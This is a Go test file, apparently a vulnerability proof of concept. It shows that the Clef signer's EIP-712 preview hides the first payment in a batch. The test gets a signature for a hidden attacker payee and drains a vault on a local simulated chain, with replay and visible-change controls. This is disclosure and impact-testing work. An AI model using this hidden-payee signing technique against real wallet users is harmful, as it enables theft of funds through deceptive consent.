package core_test

import (
    "bytes"
    "context"
    "encoding/hex"
    "errors"
    "fmt"
    "math/big"
    "os"
    "strings"
    "testing"
    "time"

    "github.com/electroneum/electroneum-sc/accounts/abi"
    "github.com/electroneum/electroneum-sc/accounts/abi/bind"
    "github.com/electroneum/electroneum-sc/accounts/abi/bind/backends"
    "github.com/electroneum/electroneum-sc/common"
    "github.com/electroneum/electroneum-sc/common/math"
    chaincore "github.com/electroneum/electroneum-sc/core"
    "github.com/electroneum/electroneum-sc/crypto"
    clefcore "github.com/electroneum/electroneum-sc/signer/core"
    "github.com/electroneum/electroneum-sc/signer/core/apitypes"
    "github.com/electroneum/electroneum-sc/signer/fourbyte"
    "github.com/electroneum/electroneum-sc/signer/storage"
)

// A standalone, local economic-impact DISCRIMINATOR for a Clef rendering bug.
// No mainnet accounts, public endpoints, third-party contracts, or real funds.
// The vault is a deliberately supplied, correctly EIP-712-validating example
// of a downstream integration, NOT an Electroneum contract vulnerability.
type cVaultConsentUI struct {
    *headlessUi
    expectedPreview string
    previews []string
    payloads [][]byte
    approvals []bool
}
func cVaultPreview(nv []*apitypes.NameValueType) string {
    var b strings.Builder
    for _,m := range nv { b.WriteString(m.Pprint(1)) }
    return b.String()
}
func (ui *cVaultConsentUI) ApproveSignData(r *clefcore.SignDataRequest) (clefcore.SignDataResponse,error) {
    displayed:=cVaultPreview(r.Messages)
    allowed:=displayed==ui.expectedPreview
    ui.previews=append(ui.previews,displayed)
    ui.payloads=append(ui.payloads,append([]byte(nil),r.Rawdata...))
    ui.approvals=append(ui.approvals,allowed)
    return clefcore.SignDataResponse{Approved:allowed},nil
}
func cVaultBatch(verifier, first, last common.Address, amount, nonce *big.Int) apitypes.TypedData {
    return apitypes.TypedData{
        Types:apitypes.Types{
            "EIP712Domain":{
                {Name:"name",Type:"string"},{Name:"version",Type:"string"},
                {Name:"chainId",Type:"uint256"},{Name:"verifyingContract",Type:"address"},
            },
            "Batch":{
                {Name:"instructions",Type:"Payment[]"},{Name:"nonce",Type:"uint256"},
            },
            "Payment":{
                {Name:"payee",Type:"address"},{Name:"amount",Type:"uint256"},
            },
        },
        Domain:apitypes.TypedDataDomain{
            Name:"Clef Batch Authorization",
            Version:"1",
            ChainId:(*math.HexOrDecimal256)(big.NewInt(1337)),
            VerifyingContract:verifier.Hex(),
        },
        PrimaryType:"Batch",
        Message:apitypes.TypedDataMessage{
            "nonce":nonce.String(),
            "instructions":[]interface{}{
                map[string]interface{}{"payee":first.Hex(),"amount":amount.String()},
                map[string]interface{}{"payee":last.Hex(),"amount":"1"},
            },
        },
    }
}
func cVaultMustReceipt(t *testing.T, ctx context.Context, sim *backends.SimulatedBackend,
                       hash common.Hash, success bool) {
    t.Helper()
    r,e:=sim.TransactionReceipt(ctx,hash)
    if e!=nil {t.Fatalf("receipt %s: %v",hash,e)}
    if r==nil {t.Fatalf("missing receipt %s",hash)}
    if (r.Status==1)!=success {t.Fatalf("receipt status=%d, want success=%v tx=%s",r.Status,success,hash)}
}
func cVaultReadBalance(t *testing.T, ctx context.Context, sim *backends.SimulatedBackend,
                       addr common.Address) *big.Int {
    t.Helper()
    v,e:=sim.BalanceAt(ctx,addr,nil)
    if e!=nil{t.Fatal(e)}
    return v
}
func cVaultPayout(t *testing.T, parsed abi.ABI, sim *backends.SimulatedBackend,
                  from *bind.TransactOpts, contractAddr common.Address, owner common.Address,
                  attacker, benign common.Address, amount *big.Int, sig []byte) common.Hash {
    t.Helper()
    if len(sig)!=65 || (sig[64]!=27 && sig[64]!=28){t.Fatalf("bad Clef legacy signature format")}
    var r,s [32]byte
    copy(r[:],sig[:32]); copy(s[:],sig[32:64])
    bound:=bind.NewBoundContract(contractAddr,parsed,sim,sim,sim)
    from.Value=nil
    tx,e:=bound.Transact(from,"execute",owner,
        []common.Address{attacker,benign},
        []*big.Int{new(big.Int).Set(amount),big.NewInt(1)},sig[64],r,s)
    if e!=nil{t.Fatalf("execute not transmitted: %v",e)}
    sim.Commit()
    return tx.Hash()
}
func TestWorkerCClefBatchVaultEconomicEffect(t *testing.T) {
    abiBytes,e:=os.ReadFile("poc_SignedBatchVault.abi")
    if e!=nil{t.Fatalf("ABI fixture missing: %v",e)}
    bytecodeHex,e:=os.ReadFile("poc_SignedBatchVault.bin")
    if e!=nil{t.Fatalf("bytecode fixture missing: %v",e)}
    parsed,e:=abi.JSON(strings.NewReader(string(abiBytes)))
    if e!=nil{t.Fatal(e)}
    bytecode,e:=hex.DecodeString(strings.TrimSpace(string(bytecodeHex)))
    if e!=nil||len(bytecode)==0{t.Fatalf("bytecode invalid: %v",e)}
    ctx:=context.Background()
    for _,seed:=range []int64{11,17,29} {
        t.Run(fmt.Sprintf("fresh-independent-chain-%d",seed),func(t *testing.T) {
            db,e:=fourbyte.New();if e!=nil{t.Fatal(e)}
            ui:=&cVaultConsentUI{headlessUi:&headlessUi{
                approveCh:make(chan string,8),inputCh:make(chan string,8)}}
            am:=clefcore.StartClefAccountManager(t.TempDir(),true,true,"")
            signer:=clefcore.NewSignerAPI(am,1337,true,ui,db,true,&storage.NoStorage{})
            ui.approveCh<-"Y";ui.inputCh<-"a_long_password"
            owner,e:=signer.New(ctx);if e!=nil{t.Fatal(e)}
            time.Sleep(350*time.Millisecond)
            relayerKey,e:=crypto.GenerateKey();if e!=nil{t.Fatal(e)}
            relayer:=crypto.PubkeyToAddress(relayerKey.PublicKey)
            tenETH:=new(big.Int).Mul(big.NewInt(10),big.NewInt(1e18))
            hundredETH:=new(big.Int).Mul(big.NewInt(100),big.NewInt(1e18))
            sim:=backends.NewSimulatedBackend(chaincore.GenesisAlloc{
                relayer:{Balance:hundredETH},
            },30_000_000)
            defer sim.Close()
            auth,e:=bind.NewKeyedTransactorWithChainID(relayerKey,big.NewInt(1337))
            if e!=nil{t.Fatal(e)}
            auth.Context=ctx
            auth.GasLimit=9_000_000
            addr,deployTx,_,e:=bind.DeployContract(auth,parsed,bytecode,sim)
            if e!=nil{t.Fatalf("contract deployment: %v",e)}
            sim.Commit()
            cVaultMustReceipt(t,ctx,sim,deployTx.Hash(),true)
            bound:=bind.NewBoundContract(addr,parsed,sim,sim,sim)
            auth.Value=new(big.Int).Set(tenETH)
            deposit,e:=bound.Transact(auth,"depositFor",owner)
            if e!=nil{t.Fatalf("depositFor: %v",e)}
            sim.Commit()
            cVaultMustReceipt(t,ctx,sim,deposit.Hash(),true)
            auth.Value=nil
            attacker:=common.Address{0xA5,byte(seed)}
            benign:=common.Address{0xB5,byte(seed)}
            maliciousAmount:=new(big.Int).Mul(big.NewInt(seed%5+5),big.NewInt(1e18))
            nonce:=big.NewInt(0)
            honest:=cVaultBatch(addr,owner,benign,maliciousAmount,nonce)
            msgs,e:=honest.Format();if e!=nil{t.Fatal(e)}
            ui.expectedPreview=cVaultPreview(msgs)
            if ui.expectedPreview=="" {t.Fatal("empty preview")}
            ownerMixed:=common.NewMixedcaseAddress(owner)
            ui.inputCh<-"a_long_password"
            honestSig,e:=signer.SignTypedData(ctx,ownerMixed,honest)
            if e!=nil || len(honestSig)!=65 {t.Fatalf("honest control signed failed %v",e)}
            t.Logf("C_BATCH_HONEST_SIGNED state=%d owner=%s contract=%s",seed,owner,addr)
            bad:=cVaultBatch(addr,attacker,benign,maliciousAmount,nonce)
            ui.inputCh<-"a_long_password"
            badSig,e:=signer.SignTypedData(ctx,ownerMixed,bad)
            if e!=nil || len(badSig)!=65{t.Fatalf("adversarial request did not receive signature: %v",e)}
            if len(ui.previews)!=2 || ui.previews[0]!=ui.previews[1]{
                t.Fatal("approval preview changed with first payment; hypothesis defeated")
            }
            if !ui.approvals[0] || !ui.approvals[1] {
                t.Fatal("baseline and adversarial signing were not both consented")
            }
            if bytes.Equal(ui.payloads[0],ui.payloads[1]) || bytes.Equal(honestSig,badSig) {
                t.Fatal("signed digest did not include the hidden first payment")
            }
            if strings.Contains(ui.previews[1],attacker.Hex()) {
                t.Fatal("attacker payee is displayed, no hidden intent")
            }
            digest:=crypto.Keccak256(ui.payloads[1])
            compact:=append([]byte(nil),badSig...);compact[64]-=27
            recovered,e:=crypto.SigToPub(digest,compact)
            if e!=nil || crypto.PubkeyToAddress(*recovered)!=owner {
                t.Fatalf("signed hidden payment didn't recover actual owner: %v",e)
            }
            beforeAttacker:=cVaultReadBalance(t,ctx,sim,attacker)
            beforeBenign:=cVaultReadBalance(t,ctx,sim,benign)
            beforeVault:=cVaultReadBalance(t,ctx,sim,addr)
            receiptHash:=cVaultPayout(t,parsed,sim,auth,addr,owner,attacker,benign,maliciousAmount,badSig)
            cVaultMustReceipt(t,ctx,sim,receiptHash,true)
            afterAttacker:=cVaultReadBalance(t,ctx,sim,attacker)
            afterBenign:=cVaultReadBalance(t,ctx,sim,benign)
            afterVault:=cVaultReadBalance(t,ctx,sim,addr)
            gotAmount:=new(big.Int).Sub(afterAttacker,beforeAttacker)
            gotBenign:=new(big.Int).Sub(afterBenign,beforeBenign)
            vaultLoss:=new(big.Int).Sub(beforeVault,afterVault)
            expectedLoss:=new(big.Int).Add(maliciousAmount,big.NewInt(1))
            if gotAmount.Cmp(maliciousAmount)!=0 || gotBenign.Cmp(big.NewInt(1))!=0 ||
                vaultLoss.Cmp(expectedLoss)!=0 {
                t.Fatalf("C_BATCH_LEDGER_ORACLE_FAIL amount=%v benign=%v vaultloss=%v",gotAmount,gotBenign,vaultLoss)
            }
            t.Logf("C_BATCH_HIDDEN_TRANSFER_CHAIN_CONFIRMED seed=%d recovered=%s attackerWei=%s vaultLossWei=%s tx=%s",
                seed,owner,gotAmount,vaultLoss,receiptHash)
            // Negative control: the visible last payment change is denied by the
            // identical policy; no signature is produced and no transaction is sent.
            visible:=cVaultBatch(addr,attacker,benign,maliciousAmount,nonce)
            visible.Message["instructions"].([]interface{})[1].(map[string]interface{})["amount"]="2"
            denied,e:=signer.SignTypedData(ctx,ownerMixed,visible)
            if !errors.Is(e,clefcore.ErrRequestDenied)||len(denied)!=0 {
                t.Fatalf("C_BATCH_VISIBLE_CONTROL_FAILED err=%v siglen=%d",e,len(denied))
            }
            t.Logf("C_BATCH_VISIBLE_MUTATION_DENIED seed=%d",seed)
            // Nonce replay control: the exact same signature must not pay twice.
            var rr,ss [32]byte
            copy(rr[:],badSig[:32]);copy(ss[:],badSig[32:64])
            replay,e:=bound.Transact(auth,"execute",owner,
                []common.Address{attacker,benign},
                []*big.Int{maliciousAmount,big.NewInt(1)},badSig[64],rr,ss)
            if e==nil {
                sim.Commit()
                cVaultMustReceipt(t,ctx,sim,replay.Hash(),false)
            }
            if cVaultReadBalance(t,ctx,sim,attacker).Cmp(afterAttacker)!=0 {
                t.Fatal("C_BATCH_REPLAY_ALTERED_BALANCE")
            }
            t.Logf("C_BATCH_REPLAY_GUARD_HELD seed=%d",seed)
            t.Logf("C_BATCH_DEFAULT_REMOTE_INGRESS_NOT_PROVEN seed=%d",seed)
        })
    }
    t.Log("C_BATCH_THREE_FRESH_EVM_STATES_COMPLETE_NOT_P1_ATTESTATION")
}
